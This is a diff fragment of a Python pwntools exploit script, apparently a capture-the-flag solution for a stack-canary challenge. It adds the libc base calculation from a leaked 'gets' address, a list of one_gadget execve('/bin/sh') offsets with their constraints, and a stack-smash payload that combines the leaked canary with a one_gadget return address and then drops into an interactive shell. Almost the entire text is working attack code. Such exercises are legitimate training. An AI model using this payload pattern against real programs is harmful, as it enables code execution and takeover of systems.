@@ -91,4 +91,34 @@ print("LIBC LEAK: ",hex(libcLeak))
 libcBase = libcLeak - libc.symbols['gets']
 print("LIBC BASE:", hex(libcBase))
 
-#
+# Just to clear first fgets
+p.sendlineafter(b"Can you help find the Canary ?", padOverBP)
+
+
+'''
+0xe3b2e execve("/bin/sh", r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xe3b31 execve("/bin/sh", r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe3b34 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+'''
+# Stack smash and use one gadget to pop shell
+print("Sending Onegadget")
+onegadget=0xe3b2e
+payload = padding
+payload += p64(canaryInt)
+payload += padOverBP
+payload += p64(libcBase + onegadget) # 0xe3b31 0xe3b34    # One gadget to launch shell
+
+# Send and then interactive
+p.sendline(payload)
+p.interactive()
